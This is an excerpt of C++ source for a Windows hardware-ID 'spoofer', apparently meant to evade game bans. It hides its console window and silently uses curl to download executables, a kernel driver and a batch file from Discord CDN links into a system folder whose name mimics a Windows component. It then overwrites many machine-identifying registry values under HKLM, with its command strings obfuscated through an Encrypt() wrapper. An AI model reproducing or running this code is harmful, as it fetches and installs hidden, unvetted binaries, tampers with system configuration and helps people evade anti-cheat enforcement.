...
int main()
{
	...
	Console();
	Cursor(false);
	SetConsoleTitleA(Encrypt("Solution"));
	system(Encrypt("color f"));
	printf(Encrypt("Press Any Key To Spoof The Device.."));
	system(Encrypt("pause >nul"));
	ShowWindow(console, SW_HIDE);
	system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1176556739953447003/1176556901333475459/Solution.exe --output C:\\Windows\\GameBarPresenceWriter\\Solution.exe >nul").decrypt());
	system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1176556739953447003/1176556912746188840/Solution64.sys --output C:\\Windows\\GameBarPresenceWriter\\Solution64.sys >nul").decrypt());
	system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1176556739953447003/1176556924335034541/Disk1.exe --output C:\\Windows\\GameBarPresenceWriter\\Disk1.exe >nul").decrypt());
	system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1176556739953447003/1176556933348597870/Disk2.exe --output C:\\Windows\\GameBarPresenceWriter\\Disk2.exe >nul").decrypt());
	system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1176556739953447003/1176556940990627880/Mac.bat --output C:\\Windows\\GameBarPresenceWriter\\Mac.bat >nul").decrypt());
	Sleep(2000);
	...
	system(Encrypt("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\BasicDisplay\\Video /v VideoID /t REG_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Hostname /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Domain /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	...
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v ProductId /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildGUID /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	...
	system(Encrypt("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\kbdclass\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
	...
	SetConsoleTitleA(Encrypt("Solution"));
	system(Encrypt("color f"));
	printf(Encrypt("The Device Is Now Spoofed.."));
	system(Encrypt("pause >nul"));
	exit(0);
}